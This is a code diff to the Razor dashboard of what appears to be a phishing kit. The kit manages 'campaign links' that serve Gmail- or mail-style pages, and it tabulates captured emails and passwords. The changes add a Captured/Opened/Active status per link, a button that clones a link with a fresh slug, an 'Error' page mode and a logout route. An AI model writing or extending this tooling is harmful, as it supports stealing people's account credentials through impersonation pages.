@@ -40,6 +40,10 @@
                 <span class="material-icons">delete_sweep</span>
                 <span class="dash-btn-label">Clear captures</span>
             </button>
+            <a href="/do-logout" class="gmail-icon-btn dash-logout-btn"
+               title="Sign out" aria-label="Sign out">
+                <span class="material-icons">logout</span>
+            </a>
             <button class="gmail-avatar dash-avatar" aria-label="Account menu"
                     @onclick="ToggleAccountMenu">
                 A
@@ -128,6 +132,7 @@
                             <tr>
                                 <th>#</th>
                                 <th>Slug</th>
+                                <th>Status</th>
                                 <th>Full URL</th>
                                 <th>Email</th>
                                 <th>Password</th>
@@ -149,6 +154,21 @@
 
                                     <td class="cl-slug">
                                         <span class="cl-slug-val">/@link.Slug</span>
+                                    </td>
+
+                                    <td class="cl-status-cell">
+                                        @if (link.IsLocked)
+                                        {
+                                            <span class="link-badge badge-captured">Captured</span>
+                                        }
+                                        else if (link.IsVisited)
+                                        {
+                                            <span class="link-badge badge-opened">Opened</span>
+                                        }
+                                        else
+                                        {
+                                            <span class="link-badge badge-active">Active</span>
+                                        }
                                     </td>
 
                                     <td class="cl-url-cell">
@@ -208,6 +228,7 @@
                                                 <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 1)" @onchange="@(() => SetPage(link, 1))" /><span>Code</span></label>
                                                 <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 2)" @onchange="@(() => SetPage(link, 2))" /><span>Gmail app</span></label>
                                                 <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 3)" @onchange="@(() => SetPage(link, 3))" /><span>Mail</span></label>
+                                                <label class="dash-radio-label"><input type="radio" name="page-@link.Id" checked="@(link.PageMode == 4)" @onchange="@(() => SetPage(link, 4))" /><span>Error</span></label>
                                             </div>
                                         }
                                         else { <span class="url-toggle-na">—</span> }
@@ -215,7 +236,12 @@
 
                                     <td class="time">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</td>
 
-                                    <td>
+                                    <td class="cl-actions-cell">
+                                        <button class="url-new-btn"
+                                                @onclick="@(() => CloneLink(link.Id))"
+                                                title="New link (same domain, fresh slug)">
+                                            <span class="material-icons">add_link</span>
+                                        </button>
                                         <button class="url-delete-btn"
                                                 @onclick="@(() => DeleteLink(link.Id))"
                                                 title="Delete">
@@ -239,9 +265,24 @@
                     var idx  = i;
                     <div class="dash-card @(link.IsLocked ? "dash-card-captured" : "")">
 
-                        <!-- slug + delete -->
+                        <!-- slug + status + actions -->
                         <div class="dash-card-header">
                             <span class="dash-card-slug">/@link.Slug</span>
+                            @if (link.IsLocked)
+                            {
+                                <span class="link-badge badge-captured">Captured</span>
+                            }
+                            else if (link.IsVisited)
+                            {
+                                <span class="link-badge badge-opened">Opened</span>
+                            }
+                            else
+                            {
+                                <span class="link-badge badge-active">Active</span>
+                            }
+                            <button class="url-new-btn" @onclick="@(() => CloneLink(link.Id))" title="New link">
+                                <span class="material-icons">add_link</span>
+                            </button>
                             <button class="url-delete-btn" @onclick="@(() => DeleteLink(link.Id))" title="Delete">
                                 <span class="material-icons">delete</span>
                             </button>
@@ -299,6 +340,7 @@
                                     <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 1)" @onchange="@(() => SetPage(link, 1))" /><span>Code</span></label>
                                     <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 2)" @onchange="@(() => SetPage(link, 2))" /><span>Gmail app</span></label>
                                     <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 3)" @onchange="@(() => SetPage(link, 3))" /><span>Mail</span></label>
+                                    <label class="dash-radio-label"><input type="radio" name="mob-page-@link.Id" checked="@(link.PageMode == 4)" @onchange="@(() => SetPage(link, 4))" /><span>Error</span></label>
                                 </div>
                             }
                         </div>
@@ -374,6 +416,12 @@
         _links = await CampaignService.GetAllAsync();
     }
 
+    private async Task CloneLink(int id)
+    {
+        await CampaignService.CloneWithNewSlugAsync(id);
+        _links = await CampaignService.GetAllAsync();
+    }
+
     private async Task SetPage(CampaignLink link, int pageMode)
     {
         await CampaignService.SetPageModeAsync(link.Id, pageMode, AppState);
@@ -392,7 +440,7 @@
     }
 
     private void ToggleAccountMenu() => _showAccountMenu = !_showAccountMenu;
-    private void SignOut() => Nav.NavigateTo("/", forceLoad: true);
+    private void SignOut() => Nav.NavigateTo("/do-logout", forceLoad: true);
 
     public void Dispose()
         => AppState.OnLogsChanged -= HandleLogsChanged;
